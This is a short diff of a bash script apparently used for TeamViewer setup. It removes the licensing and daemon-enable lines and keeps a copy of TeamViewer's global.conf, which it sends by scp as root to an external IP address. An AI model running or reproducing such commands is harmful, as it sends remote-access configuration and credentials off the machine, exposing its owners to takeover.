@@ -1,8 +1,3 @@
 #!/usr/bin/env bash
-apt-cache policy teamviewer
-sudo teamviewer license accept
-sudo teamviewer --daemon enable
-sudo teamviewer --daemon disable
-sudo teamviewer --daemon enable
 cp /opt/teamviewer/config/global.conf $HOME/tmv$(uname -n)
 scp tmv$(uname -n) root@104.248.21.69:/root/tmv/
